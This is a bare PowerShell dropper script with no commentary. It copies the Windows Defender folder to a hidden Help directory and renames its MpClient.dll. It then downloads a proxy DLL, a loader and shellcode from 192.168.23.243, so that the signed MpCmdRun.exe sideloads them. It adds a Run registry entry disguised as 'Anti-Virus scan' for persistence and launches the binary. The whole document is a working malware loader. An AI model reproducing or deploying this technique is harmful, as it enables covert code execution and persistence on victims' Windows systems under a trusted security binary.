$mainPath = "C:\\Windows\\Help\\Windows\\Defender"

$progName = "MpCmdRun.exe"
$dllPath = $mainPath + "\\MpClient.dll"
$binPath = $mainPath + "\\info.dat"
$ldrPath = $mainPath + "\\MpRunner.exe"
$originalDllPath = $mainPath + "\\MpUser.dll"

$exePath = $mainPath + "\\" + $progName
Copy-Item -Path 'C:\\Program Files\\Windows Defender\\' -Destination $mainPath -Recurse -Force
Move-Item -Path $dllPath -Destination $originalDllPath -Force

$c = New-Object System.Net.WebClient

$c.DownloadFile("http://192.168.23.243:80/MpClientProxy.dll",$dllPath)
$c.DownloadFile("http://192.168.23.243:80/MpRunner.exe",$ldrPath)
$c.DownloadFile("http://192.168.23.243:80/shellcode.bin",$binPath)

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Anti-Virus scan" -Value "cd $exePath; start $progName" -PropertyType String -Force | Out-Null
Set-Location $exePath
Start-Process $progName